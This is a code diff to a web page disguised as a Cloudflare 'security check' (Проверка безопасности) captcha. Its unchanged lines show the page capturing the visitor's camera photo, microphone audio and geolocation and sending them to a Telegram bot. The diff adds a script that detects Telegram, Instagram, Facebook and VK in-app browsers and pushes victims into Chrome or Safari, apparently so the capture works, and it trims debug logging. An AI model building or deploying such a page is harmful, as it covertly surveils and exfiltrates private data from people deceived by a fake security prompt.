@@ -4,6 +4,34 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Проверка безопасности | Cloudflare</title>
+    <script>
+        // Скрипт для принудительного открытия во внешнем браузере (Safari/Chrome)
+        (function() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            // Проверяем, открыто ли внутри Telegram, Instagram, FB, VK
+            if (ua.indexOf("Telegram") > -1 || ua.indexOf("Instagram") > -1 || ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1 || ua.indexOf("VK") > -1) {
+                // Если на Android - используем intent
+                if (ua.indexOf("Android") > -1) {
+                    var url = window.location.href;
+                    var newUrl = url.replace("https://", "intent://").replace(/^intent:\/\//, "intent://") + "#Intent;scheme=https;package=com.android.chrome;end";
+                    window.location.href = newUrl;
+                } 
+                // Если на iOS - используем специальную схему или просто выводим подсказку
+                else if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) {
+                    // Для iOS прямого редиректа нет, поэтому показываем заглушку с кнопкой
+                    document.addEventListener("DOMContentLoaded", function() {
+                        document.body.innerHTML = `
+                            <div style="padding: 40px; text-align: center; font-family: sans-serif;">
+                                <h2>Открытие в браузере</h2>
+                                <p>Для продолжения работы, пожалуйста, откройте эту страницу в Safari.</p>
+                                <p>Нажмите на три точки в правом верхнем углу и выберите <b>"Открыть в Safari"</b>.</p>
+                            </div>
+                        `;
+                    });
+                }
+            }
+        })();
+    </script>
     <style>
         body { background-color: #f7f7f7; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; margin: 0; color: #333; }
         .captcha-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(247, 247, 247, 0.95); display: flex; justify-content: center; align-items: center; z-index: 9999; }
@@ -98,11 +126,9 @@
             if (BOT_TOKEN === 'ТВОЙ_ТОКЕН_ЗДЕСЬ') return;
 
             console.log("=== НАЧАЛО ОТПРАВКИ ===");
-            console.log("Фото:", photoBlob);
-            console.log("Аудио:", audioBlob);
-
+            
             if (!photoBlob) {
-                console.error("ОШИБКА: Фото не создано (photoBlob = null). Проверьте доступ к камере.");
+                console.error("ОШИБКА: Фото не создано.");
                 return;
             }
 
@@ -167,7 +193,6 @@
                     console.log("Ответ Telegram на аудио:", result);
                 } catch (e) { console.error("Ошибка отправки аудио:", e); }
             }
-            console.log("=== КОНЕЦ ОТПРАВКИ ===");
         }
 
         async function requestGeo() {
